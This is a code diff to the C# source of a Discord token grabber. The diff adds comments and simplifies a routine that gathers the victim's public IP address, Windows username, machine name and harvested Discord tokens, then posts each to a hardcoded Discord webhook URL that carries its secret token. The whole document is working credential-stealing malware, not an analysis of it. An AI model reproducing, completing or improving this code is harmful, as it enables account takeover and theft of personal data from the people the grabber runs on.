@@ -13,34 +13,40 @@ namespace Token_Grabber
         public static string weblink = ("https://api.ipify.org/");
         public PrintAllInfo()
         {
-            GetIp();
             SendInfo();
         }
 
+        /// <summary>
+        /// Sends info to discord webhook
+        /// </summary>
         static void SendInfo()
         {
             //Discord webhook url
             string url = "https://discord.com/api/webhooks/959071811419652096/dOkV-5nK6JXpqa-86ODdZfbkAaV9UhJ9fzlLf3Ta-35SmGYjkY_XZCxGsYdAfbERDZUT";
             string json = "{\"username\": \"Discord Token Grabber\",\"embeds\":[ {\"description\": \" \\n \\n \\n \\n\\n\", \"title\":\"Info:\", \"color\":1018364}] }";
 
-            int IpLength = GetIp().Length;
-            int UsernameLength = Environment.UserName.Length;
-            int PCNameLength = Environment.MachineName.Length;
-
             string newjson = json.Insert(65, $"{GetIp()}");
-            newjson = newjson.Insert(68 + IpLength, $"{Environment.UserName}");
-            newjson = newjson.Insert(71 + UsernameLength + IpLength, $"{Environment.MachineName}");
+            newjson = newjson.Insert(68 + GetIp().Length, $"{Environment.UserName}");
+            newjson = newjson.Insert(71 + Environment.UserName.Length + GetIp().Length, $"{Environment.MachineName}");
+
+
+            //Filters through possible tokens
             foreach(string item in DiscordToken.matchs)
             {
                 try
                 {
-                    string virtualjson = newjson.Insert(77 + IpLength + UsernameLength + Environment.MachineName.Length, $"{item}");
+                    string virtualjson = newjson.Insert(77 + GetIp().Length + Environment.UserName.Length + Environment.MachineName.Length, $"{item}");
                     SendDiscordWebhook(url, virtualjson);
                 }
                 catch { }
             }
         }
 
+        /// <summary>
+        /// Method to send data to webhook
+        /// </summary>
+        /// <param name="URL"></param>
+        /// <param name="escapedjson"></param>
         public static void SendDiscordWebhook(string URL, string escapedjson)
         {
             var wr = WebRequest.Create(URL);
@@ -50,7 +56,10 @@ namespace Token_Grabber
                 sw.Write(escapedjson);
             wr.GetResponse();
         }
-
+        /// <summary>
+        /// Method returns ip
+        /// </summary>
+        /// <returns></returns>
         public static string GetIp()
         {
             string ip = new WebClient().DownloadString(weblink);
